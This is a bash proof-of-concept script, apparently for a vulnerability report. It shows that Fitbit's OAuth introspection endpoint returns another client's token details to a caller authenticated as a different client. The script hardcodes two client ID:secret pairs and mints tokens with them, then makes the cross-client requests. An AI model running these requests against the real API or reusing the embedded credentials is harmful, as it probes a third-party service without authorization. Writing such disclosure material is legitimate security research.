#!/data/data/com.termux/files/usr/bin/bash
# g-shot.sh — produce ONE clean screen worth photographing.
#
# Re-runs the decisive test now, with a header carrying the date, the external IP
# and the tool version, so the screenshot is self-contained: a reviewer can see
# WHAT was run, WHEN, FROM WHERE, and the result, without any other context.
#
# Fresh tokens are minted, so the timestamps in the output match the clock in the
# screenshot. That is deliberate - an old screenshot beside a new date is exactly
# the kind of mismatch that makes a reviewer doubt everything else.
set -u
A=$(printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64 -w0 2>/dev/null || printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64)
B=$(printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64 -w0 2>/dev/null || printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64)
I=https://api.fitbit.com/1.1/oauth2/introspect
mint() { curl -s --max-time 14 -X POST https://api.fitbit.com/oauth2/token -H "Authorization: Basic $1" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials' \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null; }

clear
echo "================================================================"
echo " Fitbit introspection does not bind a token to the caller"
printf " %s UTC   IP %s\n" "$(date -u '+%Y-%m-%d %H:%M:%S')" "$(curl -s --max-time 8 ifconfig.me)"
printf " %s\n" "$(curl --version | head -1 | cut -c1-58)"
echo "================================================================"
TA=$(mint "$A"); TB=$(mint "$B")
echo
printf " token A issued to 227ZG3 : %s chars\n" "${#TA}"
printf " token B issued to 228TQD : %s chars\n" "${#TB}"
echo
echo "---- POST /1.1/oauth2/introspect, token=<token A, owned by 227ZG3> ----"
row() { printf " %-34s " "$1"; shift
  if [ -z "$1" ]; then
    curl -s --max-time 14 -X POST "$I" -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "token=$2" -w ' [%{http_code}]\n'
  else
    curl -s --max-time 14 -X POST "$I" -H "Authorization: $1" \
      -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "token=$2" -w ' [%{http_code}]\n'
  fi | tr -d '\n' | cut -c1-120; echo; sleep 2; }
row "CONTROL  Basic 228TQD, own token" "Basic $B"   "$TB"
row "CROSS    Basic 228TQD" "Basic $B"              "$TA"
row "CROSS    Bearer 228TQD's token" "Bearer $TB"   "$TA"
row "NO AUTH  no header" ""                         "$TA"
row "FAKE     Basic bogus creds" "Basic $(printf 'ZZZZZZ:0000000000000000000000000000dead' | base64 -w0)" "$TA"
row "SENTINEL Basic 228TQD, bogus token" "Basic $B" "ZZZNOTATOKEN7x2"
echo
echo " CROSS rows return client_id 227ZG3 to a caller authenticated as 228TQD."
echo " NO AUTH and FAKE are refused; SENTINEL returns active:false."
echo "================================================================"
